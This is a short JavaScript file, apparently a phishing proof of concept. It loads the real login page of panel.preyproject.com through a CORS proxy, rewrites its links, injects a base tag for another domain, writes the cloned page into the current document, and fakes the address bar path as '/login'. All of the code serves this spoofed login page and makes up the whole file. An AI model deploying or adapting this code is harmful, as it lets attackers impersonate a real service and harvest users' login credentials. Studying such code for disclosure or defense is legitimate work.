// CORs Proxy to obtain real time login content

function doHTMLMagic(pageSource, baseURL, phishDomain) {
	replaceSrc = pageSource.replace('href="/', "href=\"" + baseURL+ '/');
	replaceSrc = replaceSrc.replace('src="/', "src=\"" + baseURL+ '/');
	replaceSrc = replaceSrc.replace('<head>', '<head><base href="' + phishDomain + '">');
	return replaceSrc;
}

// Create the XHR object. CORs request template taken from 
function createCORSRequest(method, url) {
  var xhr = new XMLHttpRequest();
  if ("withCredentials" in xhr) {
    // XHR for Chrome/Firefox/Opera/Safari.
    xhr.open(method, url, true);
  } else if (typeof XDomainRequest != "undefined") {
    // XDomainRequest for IE.
    xhr = new XDomainRequest();
    xhr.open(method, url);
  } else {
    // CORS not supported.
    xhr = null;
  }
  return xhr;
}

// Make the actual CORS request.
function makeCorsRequest() {
  var url = 'https://cors-anywhere.herokuapp.com/https://panel.preyproject.com';

  var xhr = createCORSRequest('GET', url);
  if (!xhr) {
    alert('CORS not supported');
    return;
  }

  // Response handlers.
  xhr.onload = function() {
    var pageSourceStr = doHTMLMagic(xhr.responseText, "https://panel.preyproject.com/", "https://shubh.am")
  	// Write login page contents
  	document.open();
    document.write(pageSourceStr);
    document.close();
  };

  xhr.onerror = function() {
    alert('Woops, there was an error making the request.');
  };

  xhr.send();
}

makeCorsRequest();
window.history.pushState("", "Login", "/login");
